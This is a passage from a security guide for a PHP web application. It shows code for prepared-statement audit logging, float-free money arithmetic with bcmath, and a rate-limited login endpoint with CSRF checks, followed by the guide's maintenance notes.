    $st = db()->prepare(
        'INSERT INTO activity_logs (user_id, action, entity, entity_id, before_json, after_json, ip, user_agent, created_at)
         VALUES (:u,:a,:e,:eid,:b,:af,:ip,:ua,UTC_TIMESTAMP())'
    );
    $st->execute([
        ':u'  => $_SESSION['uid'] ?? null,
        ':a'  => $action,
        ':e'  => $entity,
        ':eid'=> $entityId,
        ':b'  => $before ? json_encode($before) : null,
        ':af' => $after ? json_encode($after) : null,
        ':ip' => $_SERVER['REMOTE_ADDR'] ?? null,
        ':ua' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 255),
    ]);
}
```

### 38.2 Money handling without floats

```php
// store paisa as integers or DECIMAL strings; calculate with bcmath
function money_add(string $a, string $b): string { return bcadd($a, $b, 2); }
function money_mul(string $a, int $qty): string  { return bcmul($a, (string)$qty, 2); }
function money_pct(string $amount, string $percent): string {
    return bcdiv(bcmul($amount, $percent, 4), '100', 2);
}
```

### 38.3 Login endpoint pattern

```php
<?php
require __DIR__ . '/../includes/bootstrap.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') abort(405);
csrf_verify();

$ip    = client_ip(CLOUDFLARE_CIDRS);
$email = strtolower(trim((string)($_POST['email'] ?? '')));
$pass  = (string)($_POST['password'] ?? '');

if (!rate_limit("login:ip:$ip", 20, 900) || !rate_limit("login:email:$email", 5, 900)) {
    http_response_code(429); header('Retry-After: 900');
    exit('Too many attempts. Please try again later.');
}

$st = db()->prepare('SELECT id, password_hash, status FROM customers WHERE email = :e LIMIT 1');
$st->execute([':e' => $email]);
$user = $st->fetch();

// equalize timing when user not found
$hash = $user['password_hash'] ?? '$argon2id$v=19$m=65536,t=4,p=1$ZHVtbXlzYWx0$ZHVtbXloYXNoZHVtbXloYXNo';
$ok   = password_verify($pass, $hash) && $user && $user['status'] === 'active';

if (!$ok) {
    audit('login_failed', 'customer', $user['id'] ?? null);
    $_SESSION['flash_error'] = 'Invalid email or password.';
    safe_redirect('/login');
}

login_user((int)$user['id']);
audit('login_success', 'customer', (int)$user['id']);
safe_redirect('/account');
```

---

## Maintenance of This Document

- Review every **quarter** and after every security incident or major architecture change.
- Each new module must include a short security review referencing the checklist in §33.3.
- Version history is tracked in Git; major changes are announced to all developers.

> **Remember:** Security is a continuous process, not a one-time feature. The strongest protections are the boring ones — prepared statements, escaping, least privilege, updates, backups and monitoring — applied consistently, everywhere, every time.
